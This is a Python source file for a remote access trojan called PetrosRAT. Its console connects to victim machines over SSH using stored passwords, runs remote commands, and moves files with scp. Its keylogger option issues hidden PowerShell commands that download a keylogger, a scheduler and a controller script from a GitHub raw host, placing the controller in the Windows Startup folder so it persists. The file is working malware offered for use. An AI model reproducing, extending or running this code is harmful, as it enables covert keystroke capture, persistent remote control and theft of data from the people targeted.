#!/usr/bin/python3
# python console for RAT
# created by Petros

# imports
import os
import sys
import getpass
from paramiko import SSHClient
from  modules import *



# variables
banner = """
 ___         _                    
 | _ \  ___  | |_   _ _   ___   ___
 |  _/ / -_) |  _| | '_| / _ \ (_-<
 |_|   \___|  \__| |_|   \___/ /__/
                                   
  ___     _     _____              
 | _ \   /_\   |_   _|             
 |   /  / _ \    | |               
 |_|_\ /_/ \_\   |_|               
                                   
"""
help_menu = """
        [::] The Only RAT You'le Ever Need [::]
        [::] Created by Petros [::]

        Arguments
            XXX.rat = configuration file to add to RAT

        Example:
            python3 main.py petros.rat
"""

options_menu = """
        [+] Payloads:
            [0] - Remote Console
            [1] - Keylogger
        
        [+] Options:
            [h] or [help]       -- Help Menu
            [c] or [clear]      -- Clear UI
            [v] or [version]    -- Version Number
            [u] or [update]     -- Update PetrosRAT
            [r] or [remove]     -- Remove PetrosRAT
            [q] or [quit]       -- Quit
            
        [*] Selecct an [option]...
            
            
"""

username = getpass.getuser() # gets username
header =f"{username}@RAT $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/peterpapath/RAT/refs/heads/main" # url path for RAT files
local_path = f"/home/{username}/RAT" if username != "root" else "/root/RAT" # gets path of RAT

# read config file
def read_config(config_file):
    configuration = {}
    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IP ADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORIKING DIRECTORY"] = (read_lines[2].replace("\\", "/")).strip()
    configuration["STARTUP DIRECTORY"] = (read_lines[3].replace("\\", "/")).strip()
    
    return configuration



# clear screen
def clear():
    os.system("clear")

# update the RAT
def update():
    
    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system("curl https://raw.githubusercontent.com/peterpapath/RAT/main/version.txt | tee ~/RAT/latest.txt")

    # save version nubmers to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf ~/RAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[~] Update PetrosRAT? [y/n]\n")

        # user input, option
        option = input(f"{header}")

        # update
        if option == "y":
            os.system("bash ~/RAT/files/update.sh")

            # exception
            # else:
            #     main()

    else:
        print("\n[+] PetrosRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        #main()

# remove the RAT
def remove():
    # confirmation
    print("\n[~] Are you sure you want to remove PetrosRAT [y/n]\n")

    # user input
    option = input(header)

    # delete OnlyRAT
    if option == "y":
        os.system("rm -rf ~/RAT")

    # cancel
    if option == "n":
        main()

# terminates the programm
def exit():
    sys.exit()

# connects RAT to target
def connect(ipv4, password):
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} ")

# upload a file remotely with scp
def remote_upload(address, password, upload_file, path):
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp {upload_file} petrosrat@{address}:{path}")

# download a file remotely
def remote_download(address, password, download_file, path):
    # scp download
    os.system(f"sshpass -p \"{password}\" scp -r petrosrat@{address}:{path} {local_path}")

# run commands remotely
def remote_command(address, password, command):
    # remotely execute command
    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{address} '{command}' ")


# keylogger
def keylogger(address, password, target_username, working_directory):
    
    print("[+] Satrting Keylogger")
    # set commands-web requests
    keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/keylogger.ps1 -OutFile {working_directory}/keylogger.ps1\""
    schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/schedule.ps1 -OutFile {working_directory}/schedule.ps1\""
    controller_command = f'cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd "Start Menu" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/peterpapath/RAT/refs/heads/main/files/controller.cmd -OutFile controller.cmd'
    print("[+] Keylogger Ready")
    
    # execute command
    print("[*] Installing Keylogger")
    remote_command(address, password, keylogger_command)
    print("[*] Installing Scheduler")
    remote_command(address, password, schedule_command)
    print("[*] Installing Controller")
    remote_command(address, password, controller_command)
    
    print("[+] Keylogger Installed Successfully")


# detects os
def os_detection():
    # windows
    if os.name == "nt":
        return "w"
    # other
    if os.name == "posix":
        return "l"





# command line interface
def cli(arguments):
    # display the banner
    print(banner)

    #if arguments exist
    if arguments:
        print(options_menu)

        config_file = input(f"{header}")

        try:
            configuration = read_config(sys.argv[1])

        except FileNotFoundError:
            print("\n[!!] File Does Not Exist [!!]")
            exit()

        # get config info
        ipv4 = configuration.get("IP ADDRESS")
        password = configuration.get("PASSWORD")
        working_directory = configuration.get("WORKING DIRECTORY")
        startup_directory = configuration.get("STARTUP DIRECTORY")
        target_username = working_directory[9:-19]

        # enter option
        if config_file == "":
            main()
        
        # remote console
        if config_file == "0":
            connect(ipv4, password)
            
        #keylogger
        elif config_file == "1":
            keylogger(ipv4, password, target_username, working_directory)
            
        # help me
        elif config_file == "h" or config_file == "help":
            main()

        # clear UI
        elif config_file == "h" or config_file == "help":
            clear()
            
        # get version number
        elif config_file == "v" or config_file == "version":
            os.system(f"cat {local_path}/version.txt")
            
        # update option
        elif config_file == "u" or config_file == "update":
            update()
            exit()
            
        # remove installation
        elif config_file == "r" or config_file == "remove" or config_file == "uninstall":
            remove()
            
        # quit option
        elif config_file == "q" or config_file == "quit" or config_file == "exit":
            exit()
        
        # exception
        else:
            os.system(config_file)
            
        # print new line
        print("\n")

    # if arguments dont exist
    else:
        print(help_menu)

# main code
def main():
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    main()